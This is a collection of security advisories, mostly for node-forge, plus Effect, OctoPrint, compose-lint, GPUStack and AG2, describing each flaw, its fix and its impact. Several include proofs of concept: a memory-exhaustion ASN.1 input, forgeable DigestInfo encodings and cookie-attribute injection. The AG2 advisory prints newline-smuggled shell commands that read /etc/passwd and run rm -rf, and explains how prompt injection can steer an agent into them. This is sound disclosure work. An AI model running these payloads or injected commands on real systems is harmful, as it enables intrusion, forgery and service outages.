summary: Forge: Certificate signature verified with the issuer's RSA signature scheme
description:
### Summary

When verifying a certificate, node-forge chose the RSA padding scheme (PKCS#1 v1.5 or RSASSA-PSS) and PSS parameters from the issuer certificate's own signature algorithm instead of the certificate being verified. A certificate labeled as signed with RSASSA-PSS could pass `verifyCertificateChain()` with a PKCS#1 v1.5 signature. Fixed in node-forge 1.4.1.

### Details

`certificate.verify(child)` in `lib/x509.js` hashes the child's TBSCertificate with the digest of the child's signature algorithm, then calls `_verifySignature()` with the issuer certificate. `_verifySignature()` selected the padding scheme from that certificate's `signatureOid` and `signatureParameters`, so the child was verified with the issuer's own scheme rather than the one the child declares.

As a result, a child certificate whose signature algorithm says RSASSA-PSS was accepted with a PKCS#1 v1.5 signature when the issuer itself was signed with PKCS#1 v1.5. The outer `signatureAlgorithm` field of a certificate is not covered by the signature, so an existing PKCS#1 v1.5 (SHA-256) certificate can be relabeled as RSASSA-PSS and still pass verification. The signature itself must still be made with the issuer's private key over the certificate's contents; no certificate can be forged.

The same cause made correctly signed chains fail: a PKCS#1 v1.5 certificate issued by an RSASSA-PSS-signed certificate, or the reverse, was rejected.

The fix verifies with the child certificate's signature scheme and parameters and the issuer's public key.

### Patches
Fixed in node-forge 1.4.1. Certificate signatures are verified with the scheme of the certificate's own signature algorithm.

### Workarounds
Applications that make decisions based on a certificate's signature algorithm can verify the signature themselves with that algorithm's scheme and the issuer's public key.

### References
- https://www.rfc-editor.org/rfc/rfc4055#section-3 (RSASSA-PSS signature algorithm in certificates)
- https://www.rfc-editor.org/rfc/rfc5280#section-4.1.1.2 (Certificate signatureAlgorithm)
- https://cwe.mitre.org/data/definitions/347.html (CWE-347: Improper Verification of Cryptographic Signature)

### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (3.7, Low)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (6.3)
CVSS 4.0 rates this Moderate because its integrity weighting is higher; the severity rating follows CVSS 3.1.

### Credits
Reported by Brian Lee (@hibrian827, Georgia Tech SSLab, Team Atlanta), who also suggested the fix.

### Proof of concept

Create a CA certificate signed with sha256WithRSAEncryption, and a leaf certificate whose signature algorithm fields (outer and in the TBSCertificate) are RSASSA-PSS with SHA-256/MGF1-SHA-256/salt 32, but sign the leaf's TBSCertificate with the CA key using PKCS#1 v1.5 (`caKey.sign(sha256)`).

On 1.4.0, `forge.pki.verifyCertificateChain(forge.pki.createCaStore([ca]), [leaf])` returns `true`, although verifying the leaf's signature with RSASSA-PSS fails. On 1.4.1 it throws "Certificate signature is invalid.".

No private key is needed for the same result: take any certificate signed by the CA with sha256WithRSAEncryption and replace only its outer signatureAlgorithm (outside the signed TBSCertificate) with the RSASSA-PSS identifier above. On 1.4.0 it still verifies and reports `signatureOid` as RSASSA-PSS; on 1.4.1 it is rejected.

Regression tests are in tests/unit/x509.js ("signature scheme of the child certificate").

### Impact

Applications that rely on a certificate's declared signature algorithm, for example a policy that only accepts RSASSA-PSS-signed certificates, can be given a certificate labeled RSASSA-PSS whose signature was verified as PKCS#1 v1.5. The certificate must still have been signed by the trusted issuer's key, so the identity it certifies cannot be forged. There is no confidentiality or availability impact.

summary: Forge: Incomplete PKCS#7 padding validation in AES/DES CBC and ECB decryption
description:
### Summary
`decipher.finish()` in CBC and ECB mode accepted malformed PKCS#7 padding: only the last byte was checked, against a limit of four blocks, so mismatched padding bytes, a zero count and oversized counts were accepted and up to four blocks of plaintext could be silently removed. Fixed in node-forge 1.4.1.

### Details
`modes.cbc.prototype.unpad()` and `modes.ecb.prototype.unpad()` in `lib/cipherModes.js` read the last decrypted byte as the PKCS#7 padding count, rejected it only if it was larger than `blockSize << 2` (64 for AES, 32 for DES), and then removed that many bytes. They did not reject a count of 0 or a count larger than one block, and did not check that every padding byte equals the count, as PKCS#7 (RFC 5652 section 6.3) requires. On the Wycheproof AES-CBC-PKCS5 test vectors, 69 of 144 invalid vectors decrypted successfully.

CBC and ECB without a MAC do not provide integrity: an attacker who can modify ciphertext can already make the final block decrypt to any padding. The effect of this bug is that malformed ciphertext is accepted as valid and that oversized counts silently truncate up to four blocks of plaintext. The fix does not protect against padding oracle attacks; applications that decrypt untrusted CBC data need to authenticate it (for example with an HMAC) or use AES-GCM.

The fix requires a count from 1 to the block size and checks every padding byte. Data with other padding schemes that only use the last byte as the count (ANSI X.923, ISO 10126, XML Encryption) now fails to decrypt with default unpadding; set `decipher.mode.unpad = false` before `finish()` and remove such padding in application code.

#### Patches
Fixed in node-forge 1.4.1. CBC and ECB decryption requires valid PKCS#7 padding.

#### Workarounds
Authenticate CBC/ECB ciphertext before decrypting it, or use AES-GCM. To check padding on 1.4.0, set `decipher.mode.unpad = false` and validate the padding in application code.

#### References
- https://www.rfc-editor.org/rfc/rfc5652#section-6.3 (PKCS#7 content-encryption padding)
- https://github.com/C2SP/wycheproof/blob/master/testvectors_v1/aes_cbc_pkcs5_test.json
- https://cwe.mitre.org/data/definitions/354.html (CWE-354: Improper Validation of Integrity Check Value)

#### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N (3.7, Low)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:L/VA:N/SC:N/SI:N/SA:N (6.3)
CVSS 4.0 rates this Moderate because its integrity weighting is higher; the severity rating follows CVSS 3.1.

#### Credits
Reported by Oren Yomtov (@orenyomtov, Fireblocks), @zebbern, and Brian Lee (@hibrian827, Georgia Tech SSLab, Team Atlanta), who also suggested the fix.

### Proof of concept
    var forge = require('node-forge');
    // Wycheproof aes_cbc_pkcs5_test tcId 26: zero padding instead of PKCS#7
    var d = forge.cipher.createDecipher('AES-CBC',
      forge.util.hexToBytes('db4f3e5e3795cc09a073fa6a81e5a6bc'));
    d.start({iv: forge.util.hexToBytes('23468aa734f5f0f19827316ff168e94f')});
    d.update(forge.util.createBuffer(
      forge.util.hexToBytes('aa62606a287476777b92d8e4c4e53028')));
    console.log(d.finish()); // 1.4.0: true; 1.4.1: false

Directly, `unpad()` on 1.4.0 also accepts a final block ending in `03 02 01 04` (removing 4 bytes) and a count of 0x20 on 16-byte blocks (removing 32 bytes).

Regression tests are in tests/unit/aes.js ("PKCS#7 padding checks").

### Impact
Applications that decrypt AES or DES data in CBC or ECB mode and use the result of `decipher.finish()` to decide whether the data is valid could accept malformed ciphertext, with up to four blocks of trailing plaintext removed. This also affects PKCS#7 EncryptedData/EnvelopedData decryption, PKCS#12 and encrypted private keys. Because CBC and ECB without a MAC are malleable, the additional capability given to an attacker is small. There is no confidentiality or availability impact.

summary: Forge: X.509 pathLenConstraint not enforced by verifyCertificateChain() for CA certificates without keyUsage
description:
### Summary
`forge.pki.verifyCertificateChain()` enforces the `pathLenConstraint` of a CA certificate's `basicConstraints` extension only when that certificate also has a `keyUsage` extension. For a CA certificate with a `pathLenConstraint` and no `keyUsage`, chains with more intermediate CA certificates below it than the constraint allows are accepted. Fixed in node-forge 1.4.1.

### Details
In `pki.verifyCertificateChain()` (`lib/x509.js`), the path length check for a CA certificate was guarded by `keyUsageExt !== null && 'pathLenConstraint' in bcExt`. The `keyUsage` test was originally a proxy for "a basicConstraints extension exists". Since node-forge 1.4.0 (GHSA-2328-f5f3-gj25), basicConstraints is required for every certificate that reaches this check, so the only remaining effect of the guard is to skip `pathLenConstraint` enforcement for CA certificates without `keyUsage`.

RFC 5280 permits CA certificates without `keyUsage`, and path length processing in section 6.1.4 (l)-(m) does not depend on `keyUsage`; section 4.2.1.9 defines `pathLenConstraint` as part of basicConstraints only. For example, with a trusted root, an intermediate CA with `pathLenConstraint=0` and no `keyUsage`, a sub-CA issued by that intermediate, and a leaf issued by the sub-CA, node-forge accepts the chain. It correctly rejects the same chain when the intermediate has `keyUsage`.

The fix checks `pathLenConstraint` whenever the basicConstraints extension is present, regardless of `keyUsage` (based on PR #1142).

#### Patches
Fixed in node-forge 1.4.1. `pathLenConstraint` is now enforced for CA certificates without a `keyUsage` extension.

#### Workarounds
None in node-forge itself. Applications that pass an `options.verify` callback to `pki.verifyCertificateChain()` (or `verify` to `forge.tls.createConnection()`) can reject chains in which a CA certificate at `depth` d has `basicConstraints.pathLenConstraint < d - 1`. Re-issuing constrained CA certificates with a `keyUsage` extension that includes `keyCertSign` also restores enforcement.

#### References
- RFC 5280, sections 4.2.1.9 and 6.1.4: https://www.rfc-editor.org/rfc/rfc5280#section-6.1.4
- Related: GHSA-2328-f5f3-gj25 / CVE-2026-33896 (basicConstraints bypass, fixed in 1.4.0)
- https://github.com/digitalbazaar/forge/pull/1142

#### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N (5.9, Moderate)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (8.2)
CVSS 4.0 weights the attack preconditions differently and scores this higher; the severity rating follows CVSS 3.1.

#### Credits
@offset, @eddieran, also reported independently by Zion Boggan (@zionboggan) and @EchoSkorJjj.

### Proof of concept
Build the chain root <- int <- subCA <- leaf, where `int` has basicConstraints `cA=true, pathLenConstraint=0` and no `keyUsage`, `subCA` is a CA certificate issued by `int`, and `leaf` is issued by `subCA`:

```js
var caStore = forge.pki.createCaStore([root]);
forge.pki.verifyCertificateChain(caStore, [leaf, subCA, int]);
// <= 1.4.0: true (pathLenConstraint=0 ignored)
// 1.4.1: throws "Certificate basicConstraints pathLenConstraint violated."
```

The same chain is rejected on <= 1.4.0 when `int` also has a `keyUsage` extension with `keyCertSign`. The fix adds regression tests in `tests/unit/x509.js` and the reporter's PoC as `tests/pocs/ghsa-h46v-rmh6-fq4f.js`.

### Impact
Applications that verify certificate chains with `forge.pki.verifyCertificateChain()`, including TLS peer certificate verification in `forge.tls`, are affected when a CA they trust (directly or through a chain) has a `pathLenConstraint` and no `keyUsage` extension.

Exploitation requires such a path-length-constrained CA certificate that chains to a root the application trusts. The attacker must either hold that CA's private key or obtain a CA certificate from it. That CA can then create subordinate CAs, and certificates issued by those subordinate CAs are accepted by `pki.verifyCertificateChain()`. Public web PKI CA certificates normally include `keyUsage`. Private PKIs whose CA certificates were created without `keyUsage` are most likely to be affected.

summary: Forge: ASN.1 resource exhaustion via BIT STRING decoding in asn1.fromDer
description:
### Summary
`asn1.fromDer()` decodes the contents of BIT STRINGs as ASN.1 by default. That decode ignored the `maxDepth` recursion limit (an incomplete fix of CVE-2025-66031) and also decoded nested BIT STRINGs, keeping a full copy of the decoded contents at each level, so small crafted DER or PEM inputs (certificates, keys, PKCS structures) use excessive CPU time and memory and can abort the Node.js process. Fixed in node-forge 1.4.1.

### Details
`asn1.fromDer()` attempts by default to decode the contents of primitive BIT STRINGs as ASN.1 (`decodeBitStrings`, default `true`). Two flaws in that decode in `lib/asn1.js` allow resource exhaustion:

1. `_fromDer()` started the BIT STRING decode with a new options object, `{strict: true, decodeBitStrings: true}`, that did not include `maxDepth`. Inside that decode the depth check compared against `undefined` and never triggered, so the recursion limit added for CVE-2025-66031 (GHSA-554w-wpv2-vw27) was not enforced for anything below a decoded BIT STRING. Both the global `asn1.maxDepth` (default 256) and the per-call `maxDepth` option were ignored there. Errors in this speculative decode, including stack overflows, are caught and the contents kept as raw bytes, so deep nesting is parsed instead of rejected. This is an incomplete fix of CVE-2025-66031.
2. BIT STRINGs nested inside decoded BIT STRING contents were decoded as well, and `asn1.create()` gives each decoded BIT STRING a deep copy of its decoded contents (`obj.original`, used by `toDer()` to detect changes). Memory use therefore grows quadratically with the nesting depth, even within the default depth limit.

No specification is violated; the parser lacks a resource limit.

The fix passes `maxDepth` to the BIT STRING decode, and decodes BIT STRING contents with `decodeBitStrings: false`, so only one level of BIT STRING contents is decoded. Contents that would exceed the limit, and BIT STRINGs inside decoded BIT STRING contents, are kept as undecoded BIT STRING values; `toDer()` writes their original bytes. Common structures such as SubjectPublicKeyInfo only use one level. Code that relied on nested decoding can decode the inner value explicitly with `asn1.fromDer()`.

#### Patches
Fixed in node-forge 1.4.1. The `maxDepth` limit now applies to ASN.1 decoded from BIT STRING contents, and only one level of BIT STRING contents is decoded.

#### Workarounds
Code that calls `forge.asn1.fromDer()` directly and does not need encapsulated BIT STRING contents decoded can pass `{decodeBitStrings: false}`. This changes the parsed structure. The higher-level PKI, PKCS and TLS APIs do not expose this option and rely on the decoded form. For those, the only remedy is upgrading.

#### References
- CVE-2025-66031 / https://github.com/digitalbazaar/forge/security/advisories/GHSA-554w-wpv2-vw27 (ASN.1 Unbounded Recursion, fixed in 1.3.2)
- https://cwe.mitre.org/data/definitions/674.html (CWE-674: Uncontrolled Recursion)
- https://cwe.mitre.org/data/definitions/400.html (CWE-400: Uncontrolled Resource Consumption)

#### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (7.5, High)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N (8.7)
Both versions rate this High. The severity rating follows CVSS 3.1.

#### Credits
Reported by Ethan Kim (cremit.io), Youngjoon Kim (@acorn421) and Brian Lee (@hibrian827) of Georgia Tech SSLab, @arpitjain099, and Mike Read.

### Proof of concept
Input shape: n nested primitive BIT STRINGs (`03 <len> 00 <inner>`) around a NULL. For example:

    var asn1 = forge.asn1;
    var obj = asn1.create(asn1.Class.UNIVERSAL, asn1.Type.NULL, false, '');
    for(var i = 0; i < 2000; ++i) {
      obj = asn1.create(asn1.Class.UNIVERSAL, asn1.Type.BITSTRING, false, [obj]);
    }
    var der = asn1.toDer(obj).getBytes(); // 9,886 bytes
    asn1.fromDer(der, {maxDepth: 10});

On 1.4.0 (Node.js 24) this parses all 2,000 levels despite `maxDepth: 10`, taking about 0.5-1 s and 600 MB. One SEQUENCE holding 20 such chains (about 198 KB) aborts a process with the default heap with "FATAL ERROR: JavaScript heap out of memory", which the application cannot catch. Within the depth limit, 80 chains of 254 levels (92 KB) still use about 0.8 GB. The same inputs wrapped as PEM reach `pki.publicKeyFromPem()` and `pki.certificateFromPem()` (a 20 KB certificate PEM used 1.3 GB before being rejected). On 1.4.1 these inputs parse in a few milliseconds and about 55-65 MB.

Regression tests in tests/unit/asn1.js: "should limit depth in decoded BIT STRINGs (default)", "should limit depth in decoded BIT STRINGs (maxDepth)", "should only decode one level of BIT STRINGs" and "should not decode BIT STRINGs in many BIT STRINGs".

### Impact
A remote, unauthenticated attacker can supply a small DER or PEM structure with nested BIT STRINGs to any API that parses with `asn1.fromDer()` using default options. This includes `pki.certificateFromPem()`, `pki.publicKeyFromPem()`, the PKCS#7, PKCS#8 and PKCS#12 loaders, and server certificates received by forge's TLS client. Parsing such input consumes excessive CPU time and memory before the structure is rejected. On Node.js 24 a 10 KB input used about 600 MB and a 25 KB input about 1.4 GB. Inputs of about 25 KB abort a process limited to a 512 MB heap, and about 200 KB abort a process with the default heap, with a fatal out-of-memory error that the application cannot catch. Inputs that stay within the depth limit still reach about 0.8 GB at 92 KB and 1.8 GB at 231 KB. The result is denial of service. There is no confidentiality or integrity impact.

summary: Forge: RSA PKCS#1 v1.5 signature forgery via non-canonical DigestInfo encoding
description:
### Summary
RSASSA-PKCS1-v1_5 signature verification (`publicKey.verify()` with the default scheme, also used by X.509 certificate and PKCS#7 verification) accepted non-canonical BER encodings of the DigestInfo, such as NULL parameters with content and non-minimal lengths. These leave attacker-controlled bytes inside an accepted DigestInfo, which allows signatures to be forged without the private key for RSA keys with a low public exponent (e=3). Fixed in node-forge 1.4.1.

### Details
In `lib/rsa.js`, `key.verify()` with the default `RSASSA-PKCS1-V1_5` scheme removes the padding, parses the recovered DigestInfo with the lenient BER parser `asn1.fromDer()` and checks its structure with `asn1.validate()` against `digestInfoValidator`. Neither requires a canonical DER encoding, so verification accepted, among others:
- NULL parameters with content bytes (e.g. `05 40 <64 bytes>`)
- non-NULL or constructed values in the parameters position
- non-minimal (long form) and indefinite lengths
- non-canonical OID encodings (padded subidentifiers, trailing bytes)

These leave attacker-controlled bytes inside an accepted DigestInfo. For RSA keys with a low public exponent (e=3) this allows signatures to be forged without the private key (BERserk / Bleichenbacher-style forgery, see CVE-2014-1568).

RFC 8017 section 8.2.2 verifies a signature by encoding the expected EMSA-PKCS1-v1_5 message and comparing it with the recovered one; section 9.2 defines the DigestInfo encoding.

The fix adds `_encodeDigestInfo()`, which DER-encodes the expected DigestInfo from the digest algorithm OID and the digest (with and without NULL parameters). Verification now requires the recovered DigestInfo to match one of these encodings byte for byte. The same change fixes GHSA-2g46-22mc-6gwp (CVE-2026-85393).

#### Patches
Fixed in node-forge 1.4.1. Verification now re-encodes the expected DigestInfo and requires a byte-for-byte match (RFC 8017 section 8.2.2).

#### Workarounds
Do not use RSA keys with a low public exponent (e=3) for signature verification.

#### References
- https://www.rfc-editor.org/rfc/rfc8017#section-8.2.2
- https://www.rfc-editor.org/rfc/rfc8017#section-9.2
- CVE-2026-85393 / GHSA-2g46-22mc-6gwp (related, same fix)
- CVE-2026-33894 / https://github.com/digitalbazaar/forge/security/advisories/GHSA-ppp5-5v6c-4jwp
- https://www.cve.org/CVERecord?id=CVE-2014-1568 (BERserk)

#### Severity
CVSS 3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N (7.5, High)
CVSS 4.0 (informational): CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N (8.2)
Both versions rate this High. The severity rating follows CVSS 3.1.

#### Credits
Independently reported by Oren Yomtov (@orenyomtov, Fireblocks), Bronson Yen (Calif.io, in collaboration with Claude and Anthropic Research), Kamil Hałajda, @pzartech, @antonlissone and @Brechard.

### Proof of concept
DigestInfo encodings accepted before 1.4.1 (SHA-256; OID = 06 09 60 86 48 01 65 03 04 02 01, H = the 32-byte digest):

    NULL parameters with content:  30 33 30 0F <OID> 05 02 BE EF 04 20 <H>
    non-minimal DigestInfo length: 30 81 31 30 0D <OID> 05 00 04 20 <H>
    (canonical form:               30 31 30 0D <OID> 05 00 04 20 <H>)

Long-form lengths are accepted the same way for the DigestAlgorithm, OID, NULL and digest fields. A signature whose EMSA-PKCS1-v1_5 block (00 01 FF..FF 00 || DigestInfo) contains such an encoding verified as valid: `publicKey.verify(digest, signature)` returned true. Content bytes in the NULL parameters (reports used e.g. `05 40 <64 bytes>`) and similar slack give an attacker room to construct a forged signature for an e=3 key. With 1.4.1, verification throws "ASN.1 object does not contain a valid RSASSA-PKCS1-v1_5 DigestInfo value."

Regression tests: tests/unit/rsa.js, "canonical DigestInfo checks". They use an e=1 key, so the signature equals the encoded block, with one test per non-canonical shape (also indefinite length, constructed and non-NULL parameters, padded OID subidentifiers) and two tests that the canonical encodings with and without NULL parameters still verify. Included in the 1.4.1 release.

### Impact
Applications that verify RSASSA-PKCS1-v1_5 signatures with node-forge: `publicKey.verify()` with the default scheme, and X.509 certificate and PKCS#7 signature verification, which use it. If the verifying RSA public key has a low public exponent (e=3), an attacker can forge a signature that verifies as valid, without the private key. Only keys with a small public exponent such as e=3 are practically affected.

summary: Effect: Cookie attribute injection via domain, path, and name fields in @effect/platform makeCookie()
description:
### Impact

The `name`, `domain`, and `path` fields of `makeCookie()` were validated with a regex that allows `;`, the attribute separator in `Set-Cookie` headers. Because `serializeCookie()` writes those fields verbatim, a caller who passes untrusted input into any of them can append arbitrary attributes to the header.

For example, a `domain` of `"legit.com; Domain=.parent.tld"` serializes to `session=token; Domain=legit.com; Domain=.parent.tld`. RFC 6265 §5.3 takes the last occurrence, so the injected domain wins and the cookie widens to the parent domain. The same trick sets `SameSite=None` or `Max-Age` when the caller has not set those options itself.

The `value` field is unaffected: it passes through `encodeURIComponent`, which encodes `;`. CR and LF are rejected by the existing regex, so header splitting is not possible.

### Patches

Fixed in #6763 (v4) and #6765 (v3): the shared regex is split into per-field validators that reject `;`, and `serializeCookie()` now validates before writing the header.

### Workarounds

Do not pass user input into `name`, `domain`, or `path`; set them from application constants.

summary: OctoPrint: Stored XSS via saved connection parameters
description:
## Impact

OctoPrint versions 2.0.0rc1 up until version 2.0.0rc6 are susceptible to cross-site scripting via a specially crafted default `port` or `baudrate` setting on the bundled Serial Connector plugin, supplied via the API as new defaults during a `connect` request.

## Patches

The vulnerability is patched in 2.0.0rc7.

## Workaround

Check `config.yaml` for Javascript fragments in `printerConnection.preferred.parameters.port` or `printerConnection.preferred.parameters.baudrate`. If found, remove them. You can check who of your users had access to your instance since you flashed 2.0.0rc1 or above via `auth.log`. 

## Credits

This vulnerability was discovered and responsibly disclosed to OctoPrint by "mahn-don".

## Timeline

2026-10-14: Report received
2026-10-14: Report acknowledged
2026-10-14: Report verified
2026-10-14: Fix ready for 2.0.0rc7
2026-10-20: CVE requested

summary: compose-lint: Incomplete fix for GHSA-jf3h-8jvx-vcrg: a run stopped at the finding limit quotes a secret from a CI-generated `.env`
description:
### Impact

This is an incomplete fix for GHSA-jf3h-8jvx-vcrg. 0.32.0 made findings quote the `${NAME}` a sibling `.env` filled in, instead of its value. The same release added a stop at 20,000 findings per document, and that stop is checked before the quoting step. A run that hits it reports the findings graded so far with the resolved values still in them, in text, JSON and SARIF output. That happens with or without `--allow-partial-coverage`.

The attack is the one GHSA-jf3h-8jvx-vcrg describes. In a CI workflow that writes secrets into the `.env` beside the Compose file, a pull request changes a line to `image: "${DB_PASSWORD}"`. It also pushes the document past 20,000 findings, which a few hundred lines can do, because an aliased list is graded once for each service that uses it. The secret's value is quoted in a finding that reaches the job log, the JSON output and the SARIF uploaded to Code Scanning. GitHub masks registered secrets in the job log, but not in uploaded JSON or SARIF artifacts or in Code Scanning alert text. The run exits 2, or 0 with `--allow-partial-coverage`, after the output has been written.

The preconditions are the same as for GHSA-jf3h-8jvx-vcrg. The workflow writes secrets into the `.env` beside the Compose file *and* runs on pull requests from authors who should not see them, such as a `pull_request_target` workflow that lints the pull request's files. Pull requests from forks normally run without secrets, so the common setup is not exposed. The inflated document is visible in the pull request, but the workflow runs before anyone reviews it.

Found during an internal pre-1.0 security review.

**Python package.** `compose-lint` 0.32.0. Earlier releases have no finding limit, and their quoting gap is GHSA-jf3h-8jvx-vcrg itself.

**GitHub Action.** Action tag v0.32.0 is affected. Tags before v0.22.0 install the newest release unless `version:` is set, so they currently install 0.32.0.

**pre-commit hook.** `rev: v0.32.0`.

**Docker image.** `composelint/compose-lint:0.32.0`, `:0.32` and `latest` are affected when the `.env` is mounted with the project.

### Patches

No fixed release yet.

### Workarounds

- Run with `--no-env`, which skips the sibling `.env`.
- Don't write secrets into the `.env` beside the Compose file in a job that lints untrusted pull requests.

### Reproduction

```
project/.env          DB_PASSWORD=example-secret      (written by CI, not committed)
project/compose.yml   x-p: &p [ ...200 port mappings... ]
                      services: one service with image: "${DB_PASSWORD}" and ports: *p,
                                plus about 100 more services with ports: *p
```

`compose-lint --format sarif compose.yml` exits 2 with "grading stopped at 20000 findings", and the reported findings contain `example-secret`. The same file with fewer services stays under the limit and quotes `${DB_PASSWORD}`. Checked against the 0.32.0 wheel from PyPI, using a synthetic value.

summary: GPUStack: Missing authorization on several cluster and resource endpoints allows cross-user access and cluster takeover
description:
### Impact

An authenticated non-administrative user could access a Kubernetes cluster they are not authorized to access through GPUStack's Kubernetes API proxy.

The `cluster_apiserver_proxy` handler did not perform a resource-level authorization check before forwarding requests to the selected cluster. Requests were forwarded through a worker using its Kubernetes ServiceAccount credentials.

Depending on the permissions granted to that ServiceAccount, an attacker could read sensitive Kubernetes resources, create or modify workloads, or delete resources and disrupt services. Creating attacker-controlled workloads could result in code execution in the target cluster.

Exploitation requires a Kubernetes-provider cluster with a reachable worker. The operations available to the attacker are limited by the worker's ServiceAccount permissions.

### Patches

Fixed in `gpustack` `v2.2.2`.

### Workarounds

Restrict access to the GPUStack instance to trusted administrator accounts until upgrading.

summary: AG2: Newline injection in SandboxShellTool bypasses allowed=[...] and readonly=True, enabling arbitrary command execution
description:
### Summary
SandboxShellTool's restricted modes — allowed=[...] (explicit command allowlist) and readonly=True (implicit READONLY_COMMANDS allowlist) — can both be bypassed by embedding a newline character inside the command string. The filter only inspects a single-line set of shell metacharacters, but execution runs the raw string through `sh -c`, where a shell treats an embedded newline exactly like a `;` statement separator. An agent (or content that steers the agent, e.g. via prompt injection) can therefore run arbitrary shell commands even when the tool was configured to allow only a specific command prefix or only read-only commands. With the default LocalEnvironment() backend this is a real host subprocess (its own docstring: "Commands run via subprocess on the host, so there is no real isolation"), not an isolated container, so this is full host command execution, not merely an escape from an already-sandboxed environment.

### Details
Both restricted modes are enforced by `ShellAdapter._filter()` in `ag2/tools/sandbox/adapter/shell.py`:

```python
def _filter(self, command: str) -> str | None:
    if self._allowed is not None:
        if not any(matches(p, command) for p in self._allowed):
            return f"Command not allowed: {command!r}"
        if contains_shell_operator(command):
            return f"Command not allowed (shell operators are not permitted in restricted mode): {command!r}"
    ...
```

`readonly=True` reuses this exact same branch: `SandboxShellTool.__init__` / `ShellAdapter.__init__` sets `self._allowed = list(READONLY_COMMANDS)` when `readonly` is set and no explicit `allowed` is given, so both modes share one filter and one bypass.

`contains_shell_operator()` in `ag2/tools/sandbox/filter.py` checks the command against:

```python
_SHELL_OPERATORS: tuple[str, ...] = (">", ">>", "|", ";", "&&", "||", "`", "$(")
```

This tuple has no entry for `\n` (or `\r`). `matches()` only checks that the command starts with an allowed prefix followed by a space or end-of-string; it never inspects the remainder of the string. Execution is:

```python
argv = ["sh", "-c", command]
...
return await sandbox.exec(argv, env=self._env, timeout=self._timeout)
```

A POSIX shell splits `sh -c "<line1>\n<line2>"` into two sequential statements, the same as if they were separated by `;`. So a command such as `"cat allowed_file.txt\nrm -rf /anything"`:

1. Passes `matches("cat", command)` — the string starts with `"cat "`.
2. 2. Passes `contains_shell_operator(command)` — `\n` is not a recognized operator.
3. 3. Reaches `sh -c "cat allowed_file.txt\nrm -rf /anything"`, which runs both statements.
### Proof of Concept
Verified directly against the current `main` branch (github.com/ag2ai/ag2, commit a05ff1cb6ff4955ef252a4e0d4a27d3a32ad57f0, cloned 2026-09-21), by importing the real `ag2/tools/sandbox/filter.py` module (stdlib-only, no other AG2 dependencies needed) and reproducing `ShellAdapter._filter()`'s allowlist branch verbatim:

```
=== allowed=['cat'] ===
'cat /etc/passwd; rm -rf /tmp/x'   -> Command not allowed (shell operators are not permitted in restricted mode): ...
'cat /etc/passwd && rm -rf /tmp/x' -> Command not allowed (shell operators are not permitted in restricted mode): ...
'cat /etc/passwd | rm -rf /tmp/x'  -> Command not allowed (shell operators are not permitted in restricted mode): ...
'cat /etc/passwd\nrm -rf /tmp/x'   -> None   <-- BYPASS: newline variant is NOT rejected

=== readonly=True (uses READONLY_COMMANDS as the allowed list) ===
'echo hi\nid'                      -> None   <-- BYPASS in readonly mode too

=== sh -c really treats the embedded newline as a second statement (mirrors ShellAdapter._exec_async) ===
$ sh -c 'echo first-command-output\necho SECOND-STATEMENT-RAN-$((21*2))'
first-command-output
SECOND-STATEMENT-RAN-42
```

The three standard chaining attempts (`;`, `&&`, `|`) are correctly rejected by the real filter, confirming it does real work; the newline-separated variant, expressing the same intent, is accepted by the identical filter in both restricted modes, and a real `sh -c` call confirms the shell executes both statements.

### Impact
Any agent configured with `SandboxShellTool(allowed=[...])` or `SandboxShellTool(readonly=True)` — the two configurations the tool's own docstring presents as actual security boundaries, as opposed to `blocked`, which the same docstring explicitly says "is not a security boundary" — can be made to execute arbitrary shell commands via a single embedded newline in the command argument. Because tool arguments are LLM-generated and can be steered by content the agent processes (a fetched document, tool output, or any other text reaching the model — i.e. indirect prompt injection), this is reachable without the operator of the agent writing the malicious command themselves. With the default LocalEnvironment() backend, this is command execution on the host process running the agent, not confined to a container.

### Suggested Remediation
- Add "\n" and "\r" to `_SHELL_OPERATORS` in `ag2/tools/sandbox/filter.py` so `contains_shell_operator()` rejects embedded newlines the same way it rejects `;`.
- - More robustly, execute allowlisted/readonly commands without invoking a shell in restricted mode (`shlex.split` + exec with no `sh -c` wrapper), so redirection, chaining, substitution, and every kind of statement separator are inert by construction instead of relying on an enumerated denylist.
### Environment Tested
- Repository: github.com/ag2ai/ag2, commit a05ff1cb6ff4955ef252a4e0d4a27d3a32ad57f0 (main), cloned 2026-09-21.
- - PyPI package `ag2`, version 1.0.5 per pyproject.toml on this commit.
- - Python 3, stdlib only (`subprocess`, `importlib`) against the real, unmodified `ag2/tools/sandbox/filter.py` — no AG2 runtime dependencies required to reproduce.
-

summary: GPUStack: SAML callback trusts an unverified SAMLResponse, allowing authentication bypass and account takeover
description:
### Impact

The callback Base64-decodes the posted XML, reads NameID and attributes, resolves or provisions the user, and mints a gpustack_session JWT — but never calls OneLogin_Saml2_Auth.process_response(), the step that verifies the signature, issuer, audience, destination, and time conditions.

No credentials are required, and SAML SSO does not even need to be configured. The callback processes the payload and issues a session regardless of whether SAML is set up, so every deployment is affected, not only SAML-enabled ones. Anyone who can reach the endpoint over the network can authenticate as an arbitrary identity by posting a response that names it:

- If the name matches an existing user (e.g. an administrator), the attacker receives that user's session — full account takeover, including administrator access.
- Otherwise, a new non-admin user is provisioned.

Administrator access grants full control over the deployment and the infrastructure it manages. Because Response/Assertion IDs are never consumed, a captured signed response also replays indefinitely.

Precondition: network reachability to /auth/saml/callback. SAML SSO configuration is not required. A full proof-of-concept is available privately to maintainers.


### Patches

Fixed in gpustack 2.2.2:
